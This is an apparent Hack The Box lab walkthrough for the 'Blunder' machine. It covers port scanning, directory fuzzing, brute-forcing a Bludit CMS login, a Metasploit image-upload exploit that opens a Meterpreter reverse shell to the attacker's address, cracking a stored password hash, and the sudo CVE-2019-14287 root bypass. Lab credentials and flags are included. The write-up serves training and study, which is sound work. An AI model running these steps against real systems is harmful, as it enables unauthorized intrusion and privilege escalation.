---
layout: single
title: Blunder - Hack The Box
excerpt: "Blunder was an easy box for beginners that required bruteforcing the login for a Bludit CMS, then exploiting a known CVE through Metasploit to get remote code execution. The priv esc is a neat little CVE with sudo that allows us to execute commands as root even though the root username is supposed to be blocked."
date: 2020-10-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-blunder/blunder_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - bludit cms
  - wordlist
  - cewl
  - bruteforce
  - sudo 
---

![](/assets/images/htb-writeup-blunder/blunder_logo.png)

Blunder was an easy box for beginners that required bruteforcing the login for a Bludit CMS, then exploiting a known CVE through Metasploit to get remote code execution. The priv esc is a neat little CVE with sudo that allows us to execute commands as root even though the root username is supposed to be blocked.

## Portscan

```
snowscan@kali:~$ sudo nmap -sC -sV -F 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:29 EDT
Nmap scan report for blunder.htb (10.10.10.191)
Host is up (0.63s latency).
Not shown: 98 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
```

## Website CMS

![](/assets/images/htb-writeup-blunder/image-20200530163956572.png)

The X-Powered-By header reveals the site is running on Bludit CMS:

```
snowscan@kali:~/htb/blunder$ curl -v http://blunder.htb
*   Trying 10.10.10.191:80...
* TCP_NODELAY set
* Connected to blunder.htb (10.10.10.191) port 80 (#0)
> GET / HTTP/1.1
> Host: blunder.htb
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Date: Sat, 30 May 2020 20:42:40 GMT
< Server: Apache/2.4.41 (Ubuntu)
< X-Powered-By: Bludit
< Vary: Accept-Encoding
< Content-Length: 7562
< Connection: close
< Content-Type: text/html; charset=UTF-8
```

There's an [exploit](https://www.exploit-db.com/exploits/47699) on Exploit-DB for Bludit CMS but it requires credentials.

## Bruteforcing

After dirbusting we find a **todo.txt** file that contains a potential username: **fergus**

```
wscan@kali:~/htb/blunder$ ffuf -w $WLRC -t 50 -e .txt -u http://blunder.htb/FUZZ -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://blunder.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]
LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
cgi-bin/                [Status: 301, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]

snowscan@kali:~/htb/blunder$ curl http://blunder.htb/todo.txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING

```

To brute force we can use the following script: https://rastating.github.io/bludit-brute-force-mitigation-bypass/

I modified it a little bit to take a wordlist from argv:

```python
[...]
host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

with open(sys.argv[1]) as f:
    passwords = f.read().splitlines()    
[...]
```

We can use cewl on the site to generate a wordlist.

```
snowscan@kali:~/htb/blunder$ cewl http://blunder.htb > cewl.txt
```

Next, bruteforcing...

```
snowscan@kali:~/htb/blunder$ chmod +x b.py 
snowscan@kali:~/htb/blunder$ ./b.py cewl.txt
[*] Trying: CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[*] Trying: the
[...]
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

## Getting a shell

We can use Metasploit to get a shell with `linux/http/bludit_upload_images_exec`

```
msf5 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.29      yes       The listen address (an interface may be specified)
   LPORT  80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2
```

```
msf5 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.14.29:80 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading AqdgdpaOLi.png...
[*] Uploading .htaccess...
[*] Executing AqdgdpaOLi.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 2 opened (10.10.14.29:80 -> 10.10.10.191:34040) at 2020-05-30 16:59:15 -0400
[+] Deleted .htaccess

meterpreter > shell
Process 5132 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
```

## Access to user hugo

There's another Bludit CMS installation in `/var/www/bludit-3.10.0a`

```
www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php
cat bludit-3.10.0a/bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

The password hash can be cracked online with Crackstation or a similar site: `Password120`

```
www-data@blunder:/var/www$ su -l hugo
su -l hugo
Password: Password120

hugo@blunder:~$ cat user.txt
cat user.txt
4b411f0fc0e09a1091c6de87d1f91aaf
```

## Privesc

The sudoers privileges our user has don't appear to give us anything we can use since it explicitely blocks root.
```
hugo@blunder:~$ sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```


However, because of CVE-2019-14287 in sudo, we can bypass the username check by using `#-1` and we get a root shell.
```
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/home/hugo# id
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
root@blunder:/home/hugo# cat /root/root.txt
cat /root/root.txt
5d649f5bcb1be5f93702a7a71cd4d77e
```
